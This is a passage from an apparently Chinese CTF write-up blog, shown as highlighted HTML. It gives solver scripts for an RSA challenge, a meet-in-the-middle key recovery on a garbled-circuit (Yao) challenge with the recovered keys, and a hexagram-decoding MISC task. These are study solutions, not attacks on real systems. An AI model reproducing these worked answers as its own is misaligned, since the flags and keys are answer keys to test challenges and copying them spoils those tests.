punctuation">(</span>q1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d1 <span class="token operator">=</span> invert<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> phi1<span class="token punctuation">)</span>r <span class="token operator">=</span> powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> d1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">512</span>C <span class="token operator">=</span> <span class="token number">314138995705134963765949674209997674579520613296385936644494323356626474616449345832002116061032387789940232889811877417810577261174504328571142196672295961635382151605788845659832250695248133655805670920526231489642291822105961881028933410090118643915808621533888227382756678986914466713549255082875872573630738336022955681786779227894866903014980470029300129311175129426104388783114413927510414404318697951064311913497410213165287013303821435193696139330480491</span>pqr <span class="token operator">=</span> <span class="token number">911619948379135753280277158472338758620401367671839695302515524798781840672067948187113857703065845795822924511361587073726701234792252232996432637222385990530844261677850096042369704113324684160539535870348348879313722193048824463097747849639034518789021825189407467150941299095291906449325771599816822640144434277887115737049026356758054116641646403968823314685604673290554098181881098527931284097939456611464715559804244238286600413220755256136717571673115011</span>pq <span class="token operator">=</span> pqr<span class="token operator">//</span>r<span class="token keyword">assert</span> pq<span class="token operator">*</span>r<span class="token operator">==</span>pqr<span class="token comment"># print(pq)</span><span class="token comment"># pq = 125344179764788452935958110666600751722211963386020321971128464236999765401250458368340341394237141874926209998421276275176144081702712536364906046934659970775376635578551307310851053853612888660035922692903835246762915463074024563925867028110418848125938836672083837320222436259178292257202682401312848752623</span><span class="token comment"># factor pq by yafu</span>q <span class="token operator">=</span> <span class="token number">11195721493713053816872473040574427113590459426801501041936696952855046206603519936162050813309235275210747351857314783073431341913954290041930449553437457</span>p <span class="token operator">=</span> <span class="token number">11195721493713053816872473040574427113590459426801501041936696952855046206603519936162050813309235275210747351857314783073431341913954290041930449553437439</span><span class="token keyword">assert</span> pqr<span class="token operator">==</span>p<span class="token operator">*</span>q<span class="token operator">*</span>rphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token operator">*</span>q<span class="token operator">*</span>r<span class="token operator">*</span>r<span class="token operator">*</span>r<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>flag <span class="token operator">=</span> powmod<span class="token punctuation">(</span>C<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token operator">*</span>r<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="ciruit-map"><a href="#ciruit-map" class="headerlink" title="ciruit map"></a>ciruit map</h3><ol><li>姚氏电路, <a href="https://github.com/ljahum/crypto-challenges/tree/e5a7cd6d5527c6d9ba116f7e0c2c3e3c4b04cb38/2020%E5%BD%92%E6%A1%A3/dice%20ctf2020/garbled">原题</a>, <a href="https://jsur.in/posts/2021-02-08-dicectf-2021-garbled">题解</a>.</li><li>用中间相遇找出 gate 5 和 6 中满足以下条件的所有密钥对$(k_1,k_2)$: 可以令 G_Table 中相应的 $E_{k_1}(E_{k_2}(0))$ 经过两次反向的 decode 得到 0. 而且由于 5 和 6 都是与门, 所以它们的真值表中有 3 个输出为假, 1 个为真. 在这些密钥对中筛选满足令 gate 5 的输出中有 3 个相同, 一个不同的, 即可得到它们的两个输入所对应的密钥值: $k_1^0,k_1^1,k_2^0,k_2^1$. 稍微修改一下 Joseph 博客中的代码即可:<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> block_cipher <span class="token keyword">import</span> encrypt_data<span class="token punctuation">,</span> decrypt_data<span class="token punctuation">,</span> decrypt<span class="token keyword">from</span> public_data <span class="token keyword">import</span> G_Table <span class="token keyword">as</span> g_tables<span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdict<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">import</span> json<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[!] generating lookup table...'</span><span class="token punctuation">)</span>ENCRYPTIONS_OF_ZERO <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token keyword">for</span> key <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ct <span class="token operator">=</span> encrypt_data<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    ENCRYPTIONS_OF_ZERO<span class="token punctuation">[</span>ct<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token comment"># with open('ENCRYPTIONS_OF_ZERO.json', 'r') as f:</span><span class="token comment">#     ENCRYPTIONS_OF_ZERO = json.load(f)</span><span class="token comment">#     f.close()</span><span class="token keyword">def</span> <span class="token function">meet_in_the_middle</span><span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[!] performing meet-in-the-middle attack for'</span><span class="token punctuation">,</span> ct<span class="token punctuation">)</span>    possible <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dec <span class="token operator">=</span> decrypt_data<span class="token punctuation">(</span>ct<span class="token punctuation">,</span> key<span class="token punctuation">)</span>        <span class="token keyword">if</span> dec <span class="token keyword">in</span> ENCRYPTIONS_OF_ZERO<span class="token punctuation">:</span>            possible<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> ENCRYPTIONS_OF_ZERO<span class="token punctuation">[</span>dec<span class="token punctuation">]</span>    <span class="token keyword">return</span> possible<span class="token keyword">def</span> <span class="token function">recover_keys</span><span class="token punctuation">(</span>Z<span class="token punctuation">,</span> C<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[!] recovering keys...'</span><span class="token punctuation">)</span>    z1<span class="token punctuation">,</span> z2<span class="token punctuation">,</span> z3<span class="token punctuation">,</span> z4 <span class="token operator">=</span> Z    c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4 <span class="token operator">=</span> C    <span class="token keyword">for</span> b0 <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>z1<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> a0 <span class="token keyword">in</span> z1<span class="token punctuation">[</span>b0<span class="token punctuation">]</span><span class="token punctuation">:</span>            p1 <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b0<span class="token punctuation">)</span>            <span class="token keyword">for</span> c<span class="token punctuation">,</span>z <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>z2<span class="token punctuation">,</span> z3<span class="token punctuation">,</span> z4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> a1 <span class="token keyword">in</span> z<span class="token punctuation">[</span>b0<span class="token punctuation">]</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> p1 <span class="token operator">==</span> decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> b0<span class="token punctuation">)</span><span class="token punctuation">:</span>                        b1 <span class="token operator">=</span> recover_keys_part2<span class="token punctuation">(</span>Z<span class="token punctuation">,</span> C<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b0<span class="token punctuation">)</span>                        <span class="token keyword">if</span> b1<span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'a1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a1<span class="token punctuation">&#125;</span></span><span class="token string">, b1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b1<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'a0 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a0<span class="token punctuation">&#125;</span></span><span class="token string">, b0 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b0<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>                            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>                <span class="token keyword">def</span> <span class="token function">recover_keys_part2</span><span class="token punctuation">(</span>Z<span class="token punctuation">,</span> C<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b0<span class="token punctuation">)</span><span class="token punctuation">:</span>    z1<span class="token punctuation">,</span> z2<span class="token punctuation">,</span> z3<span class="token punctuation">,</span> z4 <span class="token operator">=</span> Z    c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4 <span class="token operator">=</span> C    <span class="token keyword">for</span> c<span class="token punctuation">,</span>z <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">,</span>c4<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>z2<span class="token punctuation">,</span>z3<span class="token punctuation">,</span>z4<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> b1 <span class="token keyword">in</span> z<span class="token punctuation">:</span>            <span class="token keyword">if</span> a0 <span class="token keyword">in</span> z<span class="token punctuation">[</span>b1<span class="token punctuation">]</span> <span class="token keyword">and</span> decrypt<span class="token punctuation">(</span>c<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b1<span class="token punctuation">)</span> <span class="token operator">==</span> decrypt<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> a0<span class="token punctuation">,</span> b0<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> b1    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    Z <span class="token operator">=</span> <span class="token punctuation">[</span>meet_in_the_middle<span class="token punctuation">(</span>g_tables<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    C <span class="token operator">=</span> <span class="token punctuation">[</span>g<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> g <span class="token keyword">in</span> g_tables<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        recover_keys<span class="token punctuation">(</span><span class="token punctuation">[</span>Z<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> Z<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> Z<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>C<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> C<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> C<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>用上面的脚本求出 gate 1,2,3,4 的密钥值, 然后就可以进一步推 gate 5,6,7,8 的密钥值, over.<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> block_cipher <span class="token keyword">import</span> encrypt_data<span class="token punctuation">,</span> decrypt_data<span class="token punctuation">,</span> decrypt<span class="token keyword">from</span> public_data <span class="token keyword">import</span> G_Table<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">validate_the_circuit</span><span class="token punctuation">(</span>geta_table<span class="token punctuation">,</span> key0<span class="token punctuation">,</span> key1<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> g <span class="token keyword">in</span> geta_table<span class="token punctuation">:</span>        gl<span class="token punctuation">,</span> v <span class="token operator">=</span> g        label <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>gl<span class="token punctuation">,</span> key0<span class="token punctuation">,</span> key1<span class="token punctuation">)</span>        validation <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>v<span class="token punctuation">,</span> key0<span class="token punctuation">,</span> key1<span class="token punctuation">)</span>                <span class="token keyword">if</span> validation <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> labelk <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">"""key 1, 2a1 = 13675268, b1 = 12870274a0 = 8343801, b0 = 10251687"""</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">13675268</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8343801</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">12870274</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10251687</span><span class="token comment"># geta_table = G_Table[5]</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[1][0], k[2][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[1][1], k[2][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[1][0], k[2][1])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[1][1], k[2][1])</span><span class="token comment"># print(msg)</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">15707475</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4567418</span><span class="token triple-quoted-string string">'''key 3, 4a1 = 12490757, b1 = 3391233a0 = 6827786, b0 = 2096572'''</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6827786</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">12490757</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2096572</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3391233</span><span class="token comment"># geta_table = G_Table[6]</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[3][0], k[4][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[3][1], k[4][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[3][0], k[4][1])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[3][1], k[4][1])</span><span class="token comment"># print(msg)</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">14095476</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3648155</span><span class="token comment"># geta_table = G_Table[7]</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[5][0], k[6][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[5][1], k[6][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[5][0], k[6][1])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[5][1], k[6][1])</span><span class="token comment"># print(msg)</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">14409690</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8680011</span><span class="token comment"># geta_table = G_Table[9]</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[4][0], k[7][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[4][1], k[7][0])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[4][0], k[7][1])</span><span class="token comment"># print(msg)</span><span class="token comment"># msg = validate_the_circuit(geta_table, k[4][1], k[7][1])</span><span class="token comment"># print(msg)</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9376523</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2504390</span><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">)</span>the_chaos<span class="token operator">=</span><span class="token string">b''</span>reflag <span class="token operator">=</span> <span class="token number">0x1661fe85c7b01b3db1d432ad3c5ac83a</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    the_chaos <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>mask <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>the_chaos<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token operator">^</span>reflag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="The-is-A-tree"><a href="#The-is-A-tree" class="headerlink" title="The_is_A_tree"></a>The_is_A_tree</h3><ol><li>用 os.walk 先序遍历文件树即可, 后面还有一个伏羲 64 卦</li><li><strong>EXP</strong><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token comment"># s = ''</span><span class="token comment"># for root,dirs,files in os.walk("./"):</span><span class="token comment">#     for fname in files:</span><span class="token comment">#         # print(root, fname)</span><span class="token comment">#         f = open(root + '\\' + fname, 'r')</span><span class="token comment">#         for lines in f.readline():</span><span class="token comment">#             s += lines</span><span class="token comment">#         f.close()</span>        <span class="token comment"># print(s)</span>s <span class="token operator">=</span> <span class="token string">'Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEhOuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA=='</span><span class="token comment"># base64</span><span class="token comment"># Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫 </span><span class="token comment"># py3</span><span class="token comment"># 参考文献: https://blog.csdn.net/weixin_44110537/article/details/107494966</span>s <span class="token operator">=</span> <span class="token string">'师兑复损巽震晋姤大过讼噬嗑震恒节豫'</span>dic<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> 